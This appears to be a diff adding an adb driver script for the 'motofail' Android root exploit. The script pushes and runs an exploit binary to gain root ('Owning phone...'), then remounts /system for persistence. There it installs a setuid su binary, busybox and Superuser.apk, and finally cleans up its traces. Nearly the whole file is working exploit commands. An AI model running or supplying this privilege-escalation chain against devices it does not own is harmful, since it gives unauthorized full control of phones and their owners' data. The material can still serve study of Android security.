@@ -1,0 +1,42 @@
+$ECHO [*] 
+
+$ECHO [*] Waiting for device...
+wait-for-device
+
+$ECHO [*] Device found.
+
+$ECHO [*] Deploying payload...
+push "$ZIPFILEmotofail" /data/local/tmp/motofail
+shell "chmod 755 /data/local/tmp/motofail"
+
+$ECHO [*] Owning phone...
+shell "/data/local/tmp/motofail exploit"
+
+$ECHO [*] Rebooting device...
+reboot
+
+$ECHO [*] Waiting for phone to reboot.
+wait-for-device
+
+$ECHO [*] Attemping persistence...
+remount
+push "$ZIPFILEsu" /system/bin/su
+shell "chmod 6755 /system/bin/su"
+shell "ln -s /system/bin/su /system/xbin/su"
+push "$ZIPFILEbusybox" /system/xbin/busybox
+shell "chmod 755 /system/xbin/busybox"
+shell "/system/xbin/busybox --install /system/xbin"
+push "$ZIPFILESuperuser.apk" /system/app/Superuser.apk
+
+$ECHO [*] Cleaning up...
+shell "/data/local/tmp/motofail clean"
+shell "rm /data/local/tmp/motofail"
+
+$ECHO [*] Rebooting...
+reboot
+wait-for-device
+
+$ECHO [*] Exploit complete!
+$ECHO [*] Press any key to exit.
+
+kill-server
